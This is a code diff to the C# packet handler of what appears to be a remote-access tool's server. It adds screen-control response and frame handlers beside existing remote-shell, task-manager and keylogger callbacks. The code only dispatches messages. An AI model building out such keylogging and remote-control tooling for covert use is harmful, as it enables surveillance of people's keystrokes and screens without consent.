@@ -16,6 +16,8 @@ namespace Server.Networking
         private readonly Action<MessageBoxResponse> _onMessageBoxResponse;
         private readonly Action<ShutdownActionResponse> _onShutdownActionResponse;
         private readonly Action<TaskManagerResponse> _onTaskManagerResponse;
+        private readonly Action<ScreenControlResponse>? _onScreenControlResponse;
+        private readonly Action<ScreenControlFrame>? _onScreenControlFrame;
 
         public PacketHandler(Action<SystemInfoResponse> onSystemInfoResponse, 
                              Action<RemoteShellResponse> onRemoteShellResponse, 
@@ -25,7 +27,9 @@ namespace Server.Networking
 							 Action<TaskManagerResponse> onTaskManagerResponse,
 							 Action<KeyLoggerEvent>? onKeyLoggerEvent = null, 
                              Action<KeyLoggerBatch>? onKeyLoggerBatch = null, 
-                             Action<KeyLoggerComboEvent>? onKeyLoggerComboEvent = null)
+                             Action<KeyLoggerComboEvent>? onKeyLoggerComboEvent = null,
+                             Action<ScreenControlResponse>? onScreenControlResponse = null,
+                             Action<ScreenControlFrame>? onScreenControlFrame = null)
         {
             _onSystemInfoResponse = onSystemInfoResponse;
             _onRemoteShellResponse = onRemoteShellResponse;
@@ -36,6 +40,8 @@ namespace Server.Networking
             _onMessageBoxResponse = onMessageBoxResponse;
             _onShutdownActionResponse = onShutdownActionResponse;
             _onTaskManagerResponse = onTaskManagerResponse;
+            _onScreenControlResponse = onScreenControlResponse;
+            _onScreenControlFrame = onScreenControlFrame;
         }
 
         public void HandleLine(string json)
@@ -106,6 +112,23 @@ namespace Server.Networking
 							              _onTaskManagerResponse(taskResp);
 						            }
 						        break;
+                    
+                    case PacketType.ScreenControlResponse:
+                        var screenResp = JsonHelper.Deserialize<ScreenControlResponse>(json);
+                        if (screenResp != null && _onScreenControlResponse != null)
+                        {
+                            _onScreenControlResponse(screenResp);
+                        }
+                        break;
+                    
+                    case PacketType.ScreenControlFrame:
+                        var screenFrame = JsonHelper.Deserialize<ScreenControlFrame>(json);
+                        if (screenFrame != null && _onScreenControlFrame != null)
+                        {
+                            _onScreenControlFrame(screenFrame);
+                        }
+                        break;
+                    
                     default:
                         break;
                 }
